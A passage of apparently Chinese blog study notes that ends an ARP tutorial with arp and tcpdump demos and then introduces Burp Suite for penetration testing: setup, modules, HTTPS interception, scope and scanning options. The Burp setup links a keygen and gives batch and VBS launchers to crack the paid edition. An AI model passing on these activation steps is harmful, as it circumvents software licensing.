，目标主机收到请求后会使用<strong>单播</strong>的方式返回一个ARP响应,告知自己的MAC地址 。</p><p>拿到MAC地址后,会将映射关系缓存到ARP表,而后传递到数据链路层进行解析转换。</p><h2 id="三-ARP-协议的作用"><a href="#三-ARP-协议的作用" class="headerlink" title="三.ARP 协议的作用"></a>三.ARP 协议的作用</h2><p>网络中的数据传输所依赖的是MAC地址而不是IP地址，<strong>ARP协议负责将IP地址转换为MAC地址</strong>。</p><p>ARP协议的主要工作就是建立、查询、更新、删除ARP表项。</p><h2 id="四-ARP常用命令"><a href="#四-ARP常用命令" class="headerlink" title="四.ARP常用命令"></a>四.ARP常用命令</h2><ol><li>查询arp表：</li></ol><pre class="line-numbers language-none"><code class="language-none">arp -a   <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/assets/image-20211018181543457.png" alt="image-20211018181543457"></p><p>2.删除表内某个IP</p><pre class="line-numbers language-none"><code class="language-none">arp -d IP      <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3.tcp抓某块网卡的所有arp请求  </p><pre class="line-numbers language-none"><code class="language-none">tcpdump -i eth0 -nn arp     <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4.tcp抓取指定ip的请求</p><pre class="line-numbers language-none"><code class="language-none">tcpdump -i eth0 -nn arp and host IP     <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​         </p><h2 id="五-ARP工作过程演示"><a href="#五-ARP工作过程演示" class="headerlink" title="五.ARP工作过程演示"></a>五.ARP工作过程演示</h2><p>在centos7上通过抓包来了解arp的工作过程：</p><p>1.首先查看一下该机器有没有 ip:192.168.110.13 的mac地址</p><pre class="line-numbers language-none"><code class="language-none">arp -a如果存在则先删除掉arp -d 192.168.110.13<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>2.在centos7上抓包</p><pre class="line-numbers language-none"><code class="language-none">tcpdump -i eth0 -nn arp  或者 tcpdump -i eth0 -nn arp and host 192.168.110.13<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>3.ping一下该ip</p><pre class="line-numbers language-none"><code class="language-none">ping 192.168.110.13<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4.查看抓包结果</p><pre class="line-numbers language-none"><code class="language-none">06:07:58.827256 ARP, Request who-has 192.168.110.13 tell 192.168.110.26, length 28这句话的意思是，请问谁是192.168.110.13 ，请将你的mac地址告诉给 192.168.110.2606:07:58.827858 ARP, Reply 192.168.110.13 is-at 00:0c:29:90:e6:8d, length 46这句话的意思是，我是92.168.110.13，我的mac地址是：00:0c:29:90:e6:8d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>5.查看最新的ARP表，看看是否绑定了mac地址</p><pre class="line-numbers language-none"><code class="language-none">arp -a? (192.168.110.13) at 00:0c:29:90:e6:8d [ether] on eth0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>6.ARP的请求是一直不间断的在自动发送的，一台计算机会通信进行以下过程</p><ol><li>主动询问网段下的IP的MAC地址</li><li>主动告诉别人我的IP和MAC地址</li><li>根据应答结果实时更新ARP表的绑定关系</li></ol><h2 id="六-总结"><a href="#六-总结" class="headerlink" title="六.总结"></a>六.总结</h2><p>1.ARP协议负责将IP地址转换为MAC地址。或者说 ARP协议负责将IP地址和MAC地址进行绑定。</p><p>2.ARP协议的主要工作就是建立、查询、更新、删除ARP表项。</p><p>3.ARP的特性：无需人为干预，一直在进行轮询和应答</p>]]></content>
      
      
      <categories>
          
          <category> ARP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/26burp-suite/burpsuite/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/26burp-suite/burpsuite/</url>
      
        <content type="html"><![CDATA[<h1 id="Burp-Suite基本介绍"><a href="#Burp-Suite基本介绍" class="headerlink" title="Burp Suite基本介绍"></a>Burp Suite基本介绍</h1><h2 id="Burp历史版本"><a href="#Burp历史版本" class="headerlink" title="Burp历史版本"></a>Burp历史版本</h2><p><a href="https://portswigger.net/burp/releases">https://portswigger.net/burp/releases</a></p><h2 id="主要功能"><a href="#主要功能" class="headerlink" title="主要功能"></a>主要功能</h2><ul><li>目标：测试网站安全性 </li><li>手段：抓HTTP包、改HTTP包；自动请求、过滤响应 </li><li>场景：SQL注入、文件上传、XSS、CSRF、FUZZ、重放 攻击、密码爆破、爬取数据、漏洞扫描……</li></ul><h2 id="版本区别"><a href="#版本区别" class="headerlink" title="版本区别"></a>版本区别</h2><ul><li>企业版 Enterprise Edition </li><li>社区版 Community Edition </li><li>专业版 Professional （$399/year)</li></ul><h2 id="运行平台"><a href="#运行平台" class="headerlink" title="运行平台"></a>运行平台</h2><ul><li>Jar（推荐） </li><li>Linux </li><li>MacOS（ARM、Intel） </li><li>Window</li></ul><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><h3 id="本地文档"><a href="#本地文档" class="headerlink" title="本地文档"></a>本地文档</h3><p>问号按钮</p><h3 id="在线文档"><a href="#在线文档" class="headerlink" title="在线文档"></a>在线文档</h3><p><a href="https://portswigger.net/support">https://portswigger.net/support</a> </p><p><a href="https://portswigger.net/burp/documentation/desktop">https://portswigger.net/burp/documentation/desktop</a></p><h3 id="视频学习和练习平台"><a href="#视频学习和练习平台" class="headerlink" title="视频学习和练习平台"></a>视频学习和练习平台</h3><p><a href="https://portswigger.net/web-security">https://portswigger.net/web-security</a></p><h3 id="问答社区"><a href="#问答社区" class="headerlink" title="问答社区"></a>问答社区</h3><p><a href="https://forum.portswigger.net/">https://forum.portswigger.net/</a></p><h1 id="Burp-Suite配置"><a href="#Burp-Suite配置" class="headerlink" title="Burp Suite配置"></a>Burp Suite配置</h1><h2 id="Burp-jar包"><a href="#Burp-jar包" class="headerlink" title="Burp jar包"></a>Burp jar包</h2><h3 id="Burp-jar包-1"><a href="#Burp-jar包-1" class="headerlink" title="Burp jar包"></a>Burp jar包</h3><p>推荐2021+，jar包版本 </p><p><a href="https://portswigger.net/burp/releases">https://portswigger.net/burp/releases</a></p><h3 id="JRE环境"><a href="#JRE环境" class="headerlink" title="JRE环境"></a>JRE环境</h3><ol><li>JDK类型：推荐解压版（zip） </li><li>JDK版本：推荐JDK11 （配合Burp 2021）</li></ol><p><a href="https://repo.huaweicloud.com/java/jdk/">https://repo.huaweicloud.com/java/jdk/</a></p><h4 id="JDK11环境变量配置"><a href="#JDK11环境变量配置" class="headerlink" title="JDK11环境变量配置"></a>JDK11环境变量配置</h4><table><thead><tr><th>变量</th><th>值</th></tr></thead><tbody><tr><td>JAVA_HOME</td><td>JDK解压的根路径，比如 D:\jdk-11.0.11</td></tr><tr><td>PATH</td><td>%JAVA_HOME%\bin</td></tr></tbody></table><h3 id="激活和汉化包"><a href="#激活和汉化包" class="headerlink" title="激活和汉化包"></a>激活和汉化包</h3><h4 id="激活软件下载地址："><a href="#激活软件下载地址：" class="headerlink" title="激活软件下载地址："></a>激活软件下载地址：</h4><p><a href="https://github.com/h3110w0r1d-y/BurpLoaderKeygen/releases">https://github.com/h3110w0r1d-y/BurpLoaderKeygen/releases</a> </p><h4 id="汉化包地址："><a href="#汉化包地址：" class="headerlink" title="汉化包地址："></a>汉化包地址：</h4><p><a href="https://github.com/h3110w0r1d-y/BurpLoaderKeygen/releases/download/2.0/BurpLoaderKeygenCn.jar">https://github.com/h3110w0r1d-y/BurpLoaderKeygen/releases/download/2.0/BurpLoaderKeygenCn.jar</a></p><h2 id="Burp-Suite启动激活"><a href="#Burp-Suite启动激活" class="headerlink" title="Burp Suite启动激活"></a>Burp Suite启动激活</h2><h3 id="命令行方式启动"><a href="#命令行方式启动" class="headerlink" title="命令行方式启动"></a>命令行方式启动</h3><p><strong>burp_start.bat</strong>，内容： </p><pre class="line-numbers language-none"><code class="language-none">@echo off cmd /k "java -jar BurpLoaderKeygen.jar"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="VBS启动"><a href="#VBS启动" class="headerlink" title="VBS启动"></a>VBS启动</h3><pre class="line-numbers language-none"><code class="language-none">set ws=WScript.CreateObject("WScript.Shell") ws.Run "burp_start.bat",0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="Burp-Suite配置-1"><a href="#Burp-Suite配置-1" class="headerlink" title="Burp Suite配置"></a>Burp Suite配置</h2><h3 id="汉化说明"><a href="#汉化说明" class="headerlink" title="汉化说明"></a>汉化说明</h3><p>如果执行了上面的英文破解程序，需要先<strong>反向激活</strong>，让激活失效，再<strong>删除</strong>英文破解程序产生的<strong>config.cfg</strong>文件。</p><p>接着使用中文的破解程序激活。</p><p><strong>burp_cn_start.bat</strong> </p><pre class="line-numbers language-none"><code class="language-none">@echo off cmd /k "java -jar BurpLoaderKeygenCn.jar"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>VBS启动</strong></p><pre class="line-numbers language-none"><code class="language-none">set ws=WScript.CreateObject("WScript.Shell") ws.Run "burp_cn_start.bat",0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="Burp-Suite模块"><a href="#Burp-Suite模块" class="headerlink" title="Burp Suite模块"></a>Burp Suite模块</h1><h2 id="Burp-Suite界面布局"><a href="#Burp-Suite界面布局" class="headerlink" title="Burp Suite界面布局"></a>Burp Suite界面布局</h2><h3 id="参考手册目录全文"><a href="#参考手册目录全文" class="headerlink" title="参考手册目录全文"></a>参考手册目录全文</h3><p><a href="https://portswigger.net/burp/documentation/contents">https://portswigger.net/burp/documentation/contents</a></p><h3 id="界面总览"><a href="#界面总览" class="headerlink" title="界面总览"></a>界面总览</h3><p><img src="/assets/image-20221219180736217.png" alt="image-20221219180736217"></p><h3 id="旧版对比"><a href="#旧版对比" class="headerlink" title="旧版对比"></a>旧版对比</h3><p><img src="/assets/image-20221219180831190.png" alt="image-20221219180831190"></p><h3 id="菜单栏"><a href="#菜单栏" class="headerlink" title="菜单栏"></a>菜单栏</h3><h4 id="Burp"><a href="#Burp" class="headerlink" title="Burp"></a>Burp</h4><p><img src="/assets/image-20221219181021718.png" alt="image-20221219181021718"></p><ol><li>搜索内容 </li><li>配置库 </li><li>用户选项 </li><li>Infiltrator </li><li>Clickbandit </li><li>Collaborator clien</li></ol><h4 id="Project"><a href="#Project" class="headerlink" title="Project"></a>Project</h4><p><img src="/assets/image-20221219181129597.png" alt="image-20221219181129597"></p><ol><li>工程配置 </li><li>重命名 </li><li>保存备份 </li><li>导入配置 </li><li>导入遗留状态文件</li></ol><h4 id="Intruder"><a href="#Intruder" class="headerlink" title="Intruder"></a>Intruder</h4><p><img src="/assets/image-20221219181216302.png" alt="image-20221219181216302"></p><ol><li>发起攻击 </li><li>打开工作空间 </li><li>扫描预定义的插入点</li><li>被动扫描 主动扫描</li><li>发送到Repeater</li><li>保存、加载、复制配置</li><li>打开新标签时的操作</li><li>自动标记payload位置</li><li>配置预定义字典</li><li>关闭攻击结果时的偏好</li></ol><h4 id="Repeater"><a href="#Repeater" class="headerlink" title="Repeater"></a>Repeater</h4><p><img src="/assets/image-20221219181443476.png" alt="image-20221219181443476"></p><ol><li>更新 Content-Length </li><li>解压压缩的数据 </li><li>跟随重定向跳转</li><li>重定向的cookie处理</li><li>跨域跳转</li><li>HTTP1 行结尾</li><li>HTTP2 连接重用</li><li>剥离 HTTP2 连接头</li><li>允许 HTTP2 ALPN 覆盖</li></ol><p><a href="https://portswigger.net/burp/documentation/desktop/tools/repeater/options">https://portswigger.net/burp/documentation/desktop/tools/repeater/options</a></p><h4 id="Window"><a href="#Window" class="headerlink" title="Window"></a>Window</h4><p><img src="/assets/image-20221219181619180.png" alt="image-20221219181619180"></p><p>剥离窗口</p><h4 id="Help"><a href="#Help" class="headerlink" title="Help"></a>Help</h4><p><img src="/assets/image-20221219181646974.png" alt="image-20221219181646974"></p><ol><li>离线文档</li><li>上手用BP做渗透测试</li><li>支持中心（在线）</li><li>更新记录 </li><li>上报bug 运行诊断 </li><li>内置浏览器健康检查</li><li>许可证 </li><li>检查更新</li><li>下载其他安装器 </li><li>删除BP</li></ol><h2 id="模块总体概括"><a href="#模块总体概括" class="headerlink" title="模块总体概括"></a>模块总体概括</h2><h3 id="官方介绍"><a href="#官方介绍" class="headerlink" title="官方介绍"></a>官方介绍</h3><p><a href="https://portswigger.net/burp/documentation/desktop/tools">https://portswigger.net/burp/documentation/desktop/tools</a></p><h3 id="Dashbord仪表盘"><a href="#Dashbord仪表盘" class="headerlink" title="Dashbord仪表盘"></a>Dashbord仪表盘</h3><ul><li>扫描 </li><li>任务 Tasks </li><li>事件日志 Event Log </li><li>漏洞问题 Issue activity</li></ul><p><a href="https://portswigger.net/burp/documentation/desktop/dashboard">https://portswigger.net/burp/documentation/desktop/dashboard</a></p><h3 id="Target-目标模块"><a href="#Target-目标模块" class="headerlink" title="Target 目标模块"></a>Target 目标模块</h3><ul><li>生成站点地图（sitemap） </li><li>设置扫描域（target scope） </li><li>生成安全分析</li></ul><h3 id="Proxy-代理模块"><a href="#Proxy-代理模块" class="headerlink" title="Proxy 代理模块"></a>Proxy 代理模块</h3><p>拦截浏览器的HTTP数据包（包括请求和响应）</p><p><img src="/assets/image-20221219182424329.png" alt="image-20221219182424329"></p><h3 id="Intruder渗透模块"><a href="#Intruder渗透模块" class="headerlink" title="Intruder渗透模块"></a>Intruder渗透模块</h3><p>对拦截到的请求（地址），设置攻击载荷 （payload），利用<strong>字典</strong>进行渗透测试 </p><p>比如：目录扫描、密码暴力破解、压力测试、FUZZ等等</p><h3 id="Repeater重放模块"><a href="#Repeater重放模块" class="headerlink" title="Repeater重放模块"></a>Repeater重放模块</h3><ol><li>分析每一步具体的请求和响应内容 </li><li>修改请求和响应内容 </li><li>重发请求内容</li></ol><h3 id="Sequencer-序列器模块"><a href="#Sequencer-序列器模块" class="headerlink" title="Sequencer 序列器模块"></a>Sequencer 序列器模块</h3><p>用来评估Token、Session等关键字段 </p><p>是否可以伪造（是否固定、是否可预测）</p><p><img src="/assets/image-20221219182713921.png" alt="image-20221219182713921"></p><h3 id="Decoder-解码器模块"><a href="#Decoder-解码器模块" class="headerlink" title="Decoder 解码器模块"></a>Decoder 解码器模块</h3><p>对请求数据进行编码、解码</p><h3 id="Comparer比较器模块"><a href="#Comparer比较器模块" class="headerlink" title="Comparer比较器模块"></a>Comparer比较器模块</h3><p>对两次请求的结果进行对比</p><h3 id="Extender-扩展模块"><a href="#Extender-扩展模块" class="headerlink" title="Extender 扩展模块"></a>Extender 扩展模块</h3><p>对插件进行管理</p><h1 id="Burp-Proxy模块"><a href="#Burp-Proxy模块" class="headerlink" title="Burp Proxy模块"></a>Burp Proxy模块</h1><h2 id="网络代理"><a href="#网络代理" class="headerlink" title="网络代理"></a>网络代理</h2><p><img src="/assets/image-20221219183410409.png" alt="image-20221219183410409"></p><h2 id="网络代理的作用"><a href="#网络代理的作用" class="headerlink" title="网络代理的作用"></a>网络代理的作用</h2><ul><li>突破IP限制 </li><li>隐藏IP </li><li>加速访问</li><li>……</li></ul><h2 id="Burp代理的作用"><a href="#Burp代理的作用" class="headerlink" title="Burp代理的作用"></a>Burp代理的作用</h2><p>拦截HTTP(S)请求，并对请求和响应进行处理和利用</p><h2 id="与Fiddler、WireShark的区别"><a href="#与Fiddler、WireShark的区别" class="headerlink" title="与Fiddler、WireShark的区别"></a>与Fiddler、WireShark的区别</h2><table><thead><tr><th>对比项</th><th>Burp</th><th>Fiddler</th><th>WireShark</th></tr></thead><tbody><tr><td>平台</td><td>多平台</td><td>Windows</td><td>多平台</td></tr><tr><td>定位</td><td>渗透测试套件</td><td>Web调试工具</td><td>网络封包分析工具</td></tr><tr><td>功能</td><td>渗透测试</td><td>调试HTTP请求</td><td>分析数据</td></tr></tbody></table><h2 id="浏览器代理设置"><a href="#浏览器代理设置" class="headerlink" title="浏览器代理设置"></a>浏览器代理设置</h2><p><img src="/assets/image-20221219183719656.png" alt="image-20221219183719656"></p><ul><li>Chrome扩展插件Crx：<a href="https://crxdl.com/">https://crxdl.com</a></li><li>下载Proxy SwitchySharp</li></ul><h2 id="Burp-Suite代理设置"><a href="#Burp-Suite代理设置" class="headerlink" title="Burp Suite代理设置"></a>Burp Suite代理设置</h2><h3 id="Intercept"><a href="#Intercept" class="headerlink" title="Intercept"></a>Intercept</h3><table><thead><tr><th>操作</th><th>描述</th></tr></thead><tbody><tr><td>Forward</td><td>放行本次拦截的包，发送到服务器</td></tr><tr><td>Drop</td><td>丢弃本次拦截的包</td></tr><tr><td>on/off</td><td>拦截开关</td></tr><tr><td>Action</td><td>对数据的操作</td></tr><tr><td>Open in Browser</td><td>打开内置浏览器</td></tr></tbody></table><h3 id="Options选项"><a href="#Options选项" class="headerlink" title="Options选项"></a>Options选项</h3><table><thead><tr><th>操作</th><th>描述</th></tr></thead><tbody><tr><td>Proxy Listeners</td><td>监听器</td></tr><tr><td>Intercept Client Requests</td><td>请求拦截规则</td></tr><tr><td>Intercept Server Response</td><td>响应拦截规则</td></tr><tr><td>Response Modification</td><td>响应结果修改</td></tr><tr><td>Match and Replace</td><td>匹配和替换</td></tr><tr><td>TLS Pass Through</td><td>TLS穿透</td></tr><tr><td>Miscellaneous</td><td>杂项</td></tr></tbody></table><h2 id="Burp-Suite拦截HTTPS"><a href="#Burp-Suite拦截HTTPS" class="headerlink" title="Burp Suite拦截HTTPS"></a>Burp Suite拦截HTTPS</h2><h3 id="网站的证书的作用"><a href="#网站的证书的作用" class="headerlink" title="网站的证书的作用"></a>网站的证书的作用</h3><ol><li>操作系统安装根证书，里面有CA的公钥 </li><li>CA颁发的证书，包含机构的公钥，并且用CA的公钥对机构公钥摘要加签 </li><li>浏览器利用CA的公钥对摘要进行验签，确定机构公钥合法 </li><li>浏览器用机构的公钥与服务器协商会话密钥 </li><li>浏览器与服务器用会话密钥通信</li></ol><p><img src="/assets/image-20221219184300307.png" alt="image-20221219184300307"></p><p><img src="/assets/image-20221219184308582.png" alt="image-20221219184308582"></p><h3 id="导出证书"><a href="#导出证书" class="headerlink" title="导出证书"></a>导出证书</h3><p><img src="/assets/image-20221219184327303.png" alt="image-20221219184327303"></p><h1 id="Burp-Target模块"><a href="#Burp-Target模块" class="headerlink" title="Burp Target模块"></a>Burp Target模块</h1><h2 id="Burp渗透测试流程"><a href="#Burp渗透测试流程" class="headerlink" title="Burp渗透测试流程"></a>Burp渗透测试流程</h2><p><img src="/assets/image-20221219184447840.png" alt="image-20221219184447840"></p><h2 id="Target模块的作用"><a href="#Target模块的作用" class="headerlink" title="Target模块的作用"></a>Target模块的作用</h2><h3 id="与HTTP-History的区别"><a href="#与HTTP-History的区别" class="headerlink" title="与HTTP History的区别"></a>与HTTP History的区别</h3><ol><li>HTTP History按<strong>时间</strong>顺序记录 </li><li>Target按<strong>主机</strong>或者<strong>域名</strong>分类记录</li></ol><p><img src="/assets/image-20221219184545443.png" alt="image-20221219184545443"></p><h3 id="Target模块的作用-1"><a href="#Target模块的作用-1" class="headerlink" title="Target模块的作用"></a>Target模块的作用</h3><ol><li>把握网站的整体情况 </li><li>对一次工作的域进行分析 </li><li>分析网站存在的攻击面</li></ol><h3 id="攻击面"><a href="#攻击面" class="headerlink" title="攻击面"></a>攻击面</h3><p>对一个软件系统可以采取的攻击方法集合，一个软件 的攻击面越大安全风险就越大。 </p><p>包括：字段、协议、接口、服务、硬件的攻击点。</p><h2 id="Target设置作用域"><a href="#Target设置作用域" class="headerlink" title="Target设置作用域"></a>Target设置作用域</h2><h3 id="同一个域"><a href="#同一个域" class="headerlink" title="同一个域"></a>同一个域</h3><table><thead><tr><th>域1</th><th>域2</th><th>同域</th><th>原因</th></tr></thead><tbody><tr><td><a href="http://www.wuya.com/">http://www.wuya.com/</a></td><td><a href="http://www.wuya.com/index.html">http://www.wuya.com/index.html</a>  <a href="http://www.wuya.com/admin?a=1">http://www.wuya.com/admin?a=1</a></td><td>YES</td><td>-</td></tr><tr><td><a href="http://www.wuya.com/">http://www.wuya.com/</a></td><td><a href="https://www.wuya.com/">https://www.wuya.com/</a></td><td>NO</td><td>协议</td></tr><tr><td><a href="http://www.wuya.com/">http://www.wuya.com/</a></td><td><a href="http://www.wuya.cn/">http://www.wuya.cn/</a></td><td>NO</td><td>主域名</td></tr><tr><td><a href="http://www.wuya.com/">http://www.wuya.com/</a></td><td><a href="http://blog.wuya.com/">http://blog.wuya.com/</a></td><td>NO</td><td>子域名</td></tr><tr><td><a href="http://www.wuya.com/">http://www.wuya.com:80/</a></td><td><a href="http://www.wuya.com:7298/">http://www.wuya.com:7298/</a></td><td>NO</td><td>端口</td></tr></tbody></table><ul><li>协议、域名、端口必须相同 </li><li>目录、文件、参数可以不同</li></ul><h3 id="限定域的范围"><a href="#限定域的范围" class="headerlink" title="限定域的范围"></a>限定域的范围</h3><p>例如： </p><p>只拦截：<a href="https://www.wuya.com/">https://www.wuya.com/</a> </p><p>不拦截：<a href="https://www.wuya.com/blog">https://www.wuya.com/blog</a></p><h3 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h3><ol><li>限定Sitemap和HTTP history记录哪些域的内容 </li><li>限定Spider抓取哪些域的内容 </li><li>限定Scanner扫描哪些域的安全漏洞</li></ol><h2 id="站点地图Sitemap"><a href="#站点地图Sitemap" class="headerlink" title="站点地图Sitemap"></a>站点地图Sitemap</h2><h3 id="站点地图记录类型"><a href="#站点地图记录类型" class="headerlink" title="站点地图记录类型"></a>站点地图记录类型</h3><ol><li>自动（爬行） </li><li>手动（浏览器访问）</li></ol><h2 id="对结果进行操作"><a href="#对结果进行操作" class="headerlink" title="对结果进行操作"></a>对结果进行操作</h2><h3 id="右键菜单"><a href="#右键菜单" class="headerlink" title="右键菜单"></a>右键菜单</h3><p><img src="/assets/image-20221219191216277.png" alt="image-20221219191216277"></p><h3 id="Referer字段"><a href="#Referer字段" class="headerlink" title="Referer字段"></a>Referer字段</h3><p>作用：告诉服务器当前请求是从哪个页面链接过来的</p><p> 应用场景： </p><ol><li>来源统计 </li><li>防盗链</li></ol><h1 id="Burp-扫描功能"><a href="#Burp-扫描功能" class="headerlink" title="Burp 扫描功能"></a>Burp 扫描功能</h1><h2 id="参考资料-1"><a href="#参考资料-1" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://portswigger.net/burp/documentation/scanner">https://portswigger.net/burp/documentation/scanner</a> </p><p><a href="https://portswigger.net/burp/documentation/desktop/scanning">https://portswigger.net/burp/documentation/desktop/scanning</a></p><p> 模块总体介绍： </p><p><a href="https://portswigger.net/burp/vulnerability-scanner">https://portswigger.net/burp/vulnerability-scanner</a> </p><p>扫描功能的使用： </p><p><a href="https://portswigger.net/burp/documentation/desktop/getting-started/running-your-first-scan">https://portswigger.net/burp/documentation/desktop/getting-started/running-your-first-scan</a> </p><p>收录的漏洞 </p><p><a href="https://portswigger.net/kb/issues">https://portswigger.net/kb/issues</a></p><h2 id="漏洞扫描整体介绍"><a href="#漏洞扫描整体介绍" class="headerlink" title="漏洞扫描整体介绍"></a>漏洞扫描整体介绍</h2><h3 id="漏洞扫描与工具"><a href="#漏洞扫描与工具" class="headerlink" title="漏洞扫描与工具"></a>漏洞扫描与工具</h3><p>AWVS、Appscan、Nessus、Openvas、Goby、 Xray、ZAP……</p><h3 id="新版BP"><a href="#新版BP" class="headerlink" title="新版BP"></a>新版BP</h3><p><img src="/assets/image-20221219191758077.png" alt="image-20221219191758077"></p><p>爬行 Crwal </p><p>审计 Audit</p><h3 id="核心内容"><a href="#核心内容" class="headerlink" title="核心内容"></a>核心内容</h3><table><thead><tr><th>内容</th><th>描述</th></tr></thead><tbody><tr><td>Scan（<strong>主动</strong>扫描）</td><td>给定地址，爬取内容，检测漏洞</td></tr><tr><td>Live task（<strong>被动</strong>扫描）</td><td>对经过Proxy、Repeater、Intruder的请 求进行漏洞检测</td></tr><tr><td>live passive <strong>crawl</strong> from proxy(all traffic)</td><td>来自Proxy的被动流量抓取</td></tr><tr><td>live <strong>audit</strong> from proxy(all traffic)</td><td>流量的实时<strong>审计</strong></td></tr></tbody></table><h3 id="扫描类型"><a href="#扫描类型" class="headerlink" title="扫描类型"></a>扫描类型</h3><ul><li>Actively Scan：主动扫描 = Crawl and audit </li><li>Passively Scan：被动扫描 = Live audit</li></ul><h3 id="主动扫描"><a href="#主动扫描" class="headerlink" title="主动扫描"></a>主动扫描</h3><ul><li><p>方式：爬取所有链接，检测漏洞 </p></li><li><p>特点：发送大量请求 </p></li><li><p>使用场合：开发、测试环境 </p></li><li><p>针对漏洞： </p><p>客户端的漏洞，如XSS 、HTTP头注入、操作重定向。</p><p>服务端的漏洞，如SQL注入、命令行注入、文件遍历。</p></li></ul><h3 id="被动扫描"><a href="#被动扫描" class="headerlink" title="被动扫描"></a>被动扫描</h3><ol><li><p>方式：只检测经过BP代理服务器的地址，不爬取</p></li><li><p>特点：发送有限请求</p></li><li><p>使用场合：生产环境</p></li><li><p>针对漏洞：</p></li></ol><ul><li><p>提交的密码为未加密的明文。</p></li><li><p>不安全的cookie的属性，例如缺少HttpOnly和安全标志。</p></li><li><p>cookie的范围缺失。 </p></li><li><p>跨域脚本包含和站点引用泄露。 </p></li><li><p>表单值自动填充，尤其是密码。 </p></li><li><p>SSL保护的内容缓存。 </p></li><li><p>目录列表。 </p></li><li><p>提交密码后应答延迟。 </p></li><li><p>session令牌的不安全传输。 </p></li><li><p>敏感信息泄露，例如内部IP地址、电子邮件地址、堆枝跟踪等信息泄露。 </p></li><li><p>不安全的ViewState 的配置。 </p></li><li><p>错误或不规范的Content-Type指令。</p></li></ul><h2 id="使用BP漏扫功能"><a href="#使用BP漏扫功能" class="headerlink" title="使用BP漏扫功能"></a>使用BP漏扫功能</h2><h3 id="主动扫描的类型"><a href="#主动扫描的类型" class="headerlink" title="主动扫描的类型"></a>主动扫描的类型</h3><p><img src="/assets/image-20221220083555554.png" alt="image-20221220083555554"></p><p>Crawl 爬行（建立站点地图） </p><p>Audit 审计（扫描漏洞）</p><p>Scan Configuration：爬行和审计的设置</p><p> Application login：账号密码</p><p> Resouce pool：线程池设置</p><h3 id="爬行配置"><a href="#爬行配置" class="headerlink" title="爬行配置"></a>爬行配置</h3><table><thead><tr><th>内容</th><th>翻译</th><th>作用</th></tr></thead><tbody><tr><td>Crwal Optimization</td><td>爬行的优化</td><td>最大链接深度；更快还是更完整</td></tr><tr><td>Crwal Limits</td><td>爬行最大限制</td><td>最大时间；最多链接；最大请求数</td></tr><tr><td>Login Functions</td><td>登录注册</td><td>登录操作：自动注册；用无效的用户名主动触发登录失败</td></tr><tr><td>Handling Application</td><td>错误处理</td><td>爬行过程中的错误处理，比如超 时</td></tr><tr><td>Miscellaneous [ˌmɪsəˈleɪniəs]</td><td>杂项</td><td>杂项</td></tr></tbody></table><h3 id="审计配置"><a href="#审计配置" class="headerlink" title="审计配置"></a>审计配置</h3><table><thead><tr><th>内容</th><th>翻译</th><th>作用</th></tr></thead><tbody><tr><td>Audit Optimization</td><td>审计优化</td><td>扫描的速度和精确度</td></tr><tr><td>Issues Reported</td><td>问题报告</td><td>报告哪些漏洞：根据扫描类型或者漏洞类型 来过滤，默认全选</td></tr><tr><td>Handling Application Errors During Audit</td><td>审计过程出错 的处理</td><td>比如连接失败和传输超时默认：如果一个插 入点连续失败两次，就跳过，不再发送请求 （接口挂了） 如果连续两个插入点失败，跳过其他的插入 点（网站挂了）</td></tr><tr><td>Insertion Point Types</td><td>插入点的类型</td><td>URL参数值、Body里面的参数值、Cookie值、 参数名字、HTTP请求头、Body完整内容、 URL文件名、URL目录</td></tr><tr><td>Modifying Parameter Locations</td><td>插入点位置</td><td>替换，交叉检测</td></tr></tbody></table><h3 id="审计配置-1"><a href="#审计配置-1" class="headerlink" title="审计配置"></a>审计配置</h3><table><thead><tr><th>内容</th><th>翻译</th><th>作用</th></tr></thead><tbody><tr><td>Ignored insertion Point</td><td>忽略的插入点</td><td></td></tr><tr><td>Frequentcly Occurring Insertion Points</td><td>插入点相同时</td><td>当大量的插入点结果没有区别的 时候，更加高效地扫描。</td></tr><tr><td>Misc Insertion Point Options</td><td>杂项</td><td>一个插入点的最大请求数量</td></tr><tr><td>Java Script Analysis</td><td>JavaScript审计</td><td></td></tr></tbody></table><h3 id="主动扫描的类型-1"><a href="#主动扫描的类型-1" class="headerlink" title="主动扫描的类型"></a>主动扫描的类型</h3><p>Scan：输入URL或者URL右键 </p><p>Live Task：从其他模块获取到流量 </p><p>Live Task： </p><p>Audit 不会爬行 </p><p>passive crawl 会爬行</p><h2 id="生成扫描报告"><a href="#生成扫描报告" class="headerlink" title="生成扫描报告"></a>生成扫描报告</h2><h3 id="扫描报告"><a href="#扫描报告" class="headerlink" title="扫描报告"></a>扫描报告</h3><p><img src="/assets/image-20221220084534787.png" alt="image-20221220084534787"></p><p>右键导出</p><p><a href="https://portswigger.net/burp/samplereport/burpscannersamplereport">https://portswigger.net/burp/samplereport/burpscannersamplereport</a></p><h1 id="Burp-Repeater"><a href="#Burp-Repeater" class="headerlink" title="Burp Repeater"></a>Burp Repeater</h1><h2 id="参考资料-2"><a href="#参考资料-2" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://portswigger.net/burp/documentation/desktop/tools/repeater">https://portswigger.net/burp/documentation/desktop/tools/repeater</a></p><h2 id="Repeater模块作用"><a href="#Repeater模块作用" class="headerlink" 